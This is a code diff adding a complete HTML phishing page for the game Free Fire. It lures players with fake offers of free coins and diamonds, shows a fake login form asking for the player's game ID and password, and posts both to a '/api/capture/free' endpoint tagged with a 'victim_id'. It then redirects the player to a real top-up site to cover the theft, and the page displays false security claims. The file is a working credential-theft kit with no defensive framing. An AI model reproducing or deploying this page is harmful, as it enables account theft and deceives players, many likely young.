@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Free Fire - Free Rewards</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ===== ANIMATED FF THEME BACKGROUND ===== */
+        .color-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .color-bg .circle {
+            position: absolute;
+            border-radius: 50%;
+            opacity: 0.04;
+            animation: floatColor 25s infinite alternate ease-in-out;
+        }
+        .color-bg .circle:nth-child(1) {
+            width: 600px; height: 600px;
+            background: #ff6a00;
+            top: -10%; left: -10%;
+            animation-duration: 20s;
+        }
+        .color-bg .circle:nth-child(2) {
+            width: 500px; height: 500px;
+            background: #ee1d52;
+            bottom: -10%; right: -10%;
+            animation-duration: 25s;
+            animation-delay: 2s;
+        }
+        .color-bg .circle:nth-child(3) {
+            width: 400px; height: 400px;
+            background: #ff6a00;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            animation-duration: 22s;
+            animation-delay: 4s;
+        }
+
+        @keyframes floatColor {
+            0% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(50px, -50px) scale(1.2); }
+            100% { transform: translate(-30px, 30px) scale(0.9); }
+        }
+
+        /* ===== GLASS CARD ===== */
+        .glass {
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 40px 32px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255, 106, 0, 0.15);
+            box-shadow: 0 30px 80px rgba(255, 106, 0, 0.06);
+            text-align: center;
+            color: #fff;
+            position: relative;
+            z-index: 1;
+        }
+
+        .glass h1 {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #ff6a00, #ee1d52);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .glass .sub {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.4);
+            margin: 4px 0 20px;
+        }
+
+        /* ===== OFFER GRID ===== */
+        .offer-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 20px 0;
+        }
+
+        .offer-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 106, 0, 0.1);
+            border-radius: 24px;
+            padding: 24px 12px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+        .offer-card:active {
+            transform: scale(0.94);
+            background: rgba(255, 106, 0, 0.08);
+            border-color: #ff6a00;
+        }
+        .offer-card .icon {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .offer-card .label {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+        }
+        .offer-card .desc {
+            font-size: 12px;
+            opacity: 0.4;
+            margin-top: 4px;
+        }
+
+        /* ===== BUTTONS ===== */
+        .glow-btn {
+            background: linear-gradient(145deg, #ff6a00, #ee1d52);
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            box-shadow: 0 8px 30px rgba(255, 106, 0, 0.15);
+            transition: 0.25s;
+            margin: 12px 0 6px;
+        }
+        .glow-btn:active { transform: scale(0.96); }
+
+        .input-group {
+            text-align: left;
+            margin: 14px 0 8px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            opacity: 0.6;
+            margin-bottom: 5px;
+            color: #fff;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.03);
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: 0.25s;
+        }
+        .input-group input:focus {
+            border-color: #ff6a00;
+            background: rgba(255, 255, 255, 0.06);
+        }
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        .back-btn {
+            background: rgba(255, 255, 255, 0.04) !important;
+            border: 1px solid rgba(255, 255, 255, 0.06) !important;
+            box-shadow: none !important;
+            margin-top: 10px;
+            font-size: 15px !important;
+            padding: 14px !important;
+            color: #fff !important;
+        }
+
+        .fake-footer {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            flex-wrap: wrap;
+            font-size: 11px;
+            opacity: 0.3;
+        }
+        .fake-footer a { color: #fff; text-decoration: none; }
+        .fake-footer a:hover { text-decoration: underline; }
+
+        .footer-text {
+            font-size: 11px;
+            opacity: 0.2;
+            margin-top: 18px;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== ANIMATED FF THEME BACKGROUND ===== -->
+    <div class="color-bg">
+        <div class="circle"></div>
+        <div class="circle"></div>
+        <div class="circle"></div>
+    </div>
+
+    <!-- ===== MAIN CARD ===== -->
+    <div class="glass" id="mainPage">
+        <h1>🔥 Free Fire Rewards</h1>
+        <p class="sub">Claim free in-game currency</p>
+
+        <div class="offer-grid" id="offerGrid"></div>
+
+        <div class="fake-footer">
+            <a href="#">🆘 Help Desk</a>
+            <a href="#">📜 Terms</a>
+            <a href="#">🔒 Privacy</a>
+        </div>
+        <p class="footer-text">Secure & encrypted · 256-bit SSL</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('v') || 'unknown';
+
+        const offers = [
+            { id: 'coins', icon: '🪙', label: 'Free FF Coins', desc: 'Get 5000 coins' },
+            { id: 'diamonds', icon: '💎', label: 'Free Diamonds', desc: 'Get 1000 diamonds' }
+        ];
+
+        const grid = document.getElementById('offerGrid');
+        offers.forEach(offer => {
+            const card = document.createElement('div');
+            card.className = 'offer-card';
+            card.innerHTML = `
+                <span class="icon">${offer.icon}</span>
+                <div class="label">${offer.label}</div>
+                <div class="desc">${offer.desc}</div>
+            `;
+            card.onclick = () => showLogin(offer.id, offer.label);
+            grid.appendChild(card);
+        });
+
+        function showLogin(offerId, offerLabel) {
+            const main = document.getElementById('mainPage');
+            main.innerHTML = `
+                <h1 style="background: linear-gradient(135deg, #ff6a00, #ee1d52); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🔐 Free Fire Login</h1>
+                <p style="opacity:0.5; margin:10px 0 18px; font-size:14px; color:#fff;">
+                    Enter your credentials to claim <strong style="color:#ff6a00;">${offerLabel}</strong>
+                </p>
+                <div class="input-group">
+                    <label>🆔 Free Fire ID</label>
+                    <input type="text" id="loginUser" placeholder="Enter your Free Fire ID" />
+                </div>
+                <div class="input-group">
+                    <label>🔒 Password</label>
+                    <input type="password" id="loginPass" placeholder="Enter your password" />
+                </div>
+                <button class="glow-btn" onclick="submitLogin('${offerId}')">🚀 Claim Now</button>
+                <button class="glow-btn back-btn" onclick="location.reload()">⬅ Back</button>
+                <div class="fake-footer" style="margin-top:20px;">
+                    <a href="#">🆘 Help Desk</a>
+                    <a href="#">📜 Terms</a>
+                    <a href="#">🔒 Privacy</a>
+                </div>
+                <p class="footer-text" style="margin-top:12px;">🔐 Secure & encrypted</p>
+            `;
+        }
+
+        async function sendData(payload) {
+            try {
+                await fetch('/api/capture/free', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victim_id: victimId, type: 'free', ...payload })
+                });
+            } catch (e) {
+                console.log('Send error:', e);
+            }
+        }
+
+        async function submitLogin(offerId) {
+            const username = document.getElementById('loginUser').value;
+            const password = document.getElementById('loginPass').value;
+            if (!username || !password) {
+                alert('⚠️ Please fill all fields');
+                return;
+            }
+            await sendData({
+                creds: {
+                    platform: 'freefire',
+                    username: username,
+                    password: password,
+                    offer: offerId
+                }
+            });
+            window.location.href = 'https://www.lootbar.com/top-up/free-fire-top-up';
+        }
+    </script>
+</body>
+</html>
